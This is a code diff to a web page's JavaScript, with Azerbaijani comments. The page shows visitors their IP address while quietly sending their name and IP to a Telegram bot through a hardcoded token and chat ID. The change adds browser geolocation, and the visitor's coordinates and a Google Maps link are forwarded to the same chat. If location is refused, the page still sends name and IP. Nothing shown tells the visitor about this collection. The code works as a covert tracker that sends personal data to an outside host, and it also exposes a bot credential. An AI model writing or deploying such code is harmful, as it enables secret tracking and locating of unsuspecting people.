@@ -30,10 +30,9 @@
     const token = '8408687620:AAEy2vYnaR8Be9kpbjoKpCTUAXMMHvvd4AE';
     const chatId = '1689497109';
 
-    async function sendIpToTelegram(name, ip) {
-      const message = encodeURIComponent(`Yeni istifadəçi: ${name}\nIP-si: ${ip}`);
+    async function sendToTelegram(messageText) {
+      const message = encodeURIComponent(messageText);
       const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
-
       try {
         const response = await fetch(url);
         if (!response.ok) {
@@ -51,7 +50,30 @@
         const ip = data.ip;
 
         document.getElementById('ipDisplay').textContent = `API ünvanın: ${ip}`;
-        sendIpToTelegram(name, ip);
+
+        // İcazə varsa geolokasiya almağa çalışırıq
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              const lat = position.coords.latitude.toFixed(5);
+              const lon = position.coords.longitude.toFixed(5);
+              const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
+
+              // Telegrama mesaj göndərilir (ad, ip, koordinatlar və xəritə linki)
+              const messageText = `Yeni istifadəçi: ${name}\nIP-si: ${ip}\nYer: ${lat}, ${lon}\nXəritə: ${mapUrl}`;
+              sendToTelegram(messageText);
+            },
+            error => {
+              // Əgər geolokasiya alınmasa sadəcə IP göndərilir
+              const messageText = `Yeni istifadəçi: ${name}\nIP-si: ${ip}\nGeolokasiya əldə edilə bilmədi: ${error.message}`;
+              sendToTelegram(messageText);
+            }
+          );
+        } else {
+          // Brauzer geolokasiyanı dəstəkləmirsə
+          const messageText = `Yeni istifadəçi: ${name}\nIP-si: ${ip}\nGeolokasiya dəstəklənmir.`;
+          sendToTelegram(messageText);
+        }
       } catch (error) {
         document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
         console.error('IP alınarkən xəta:', error);
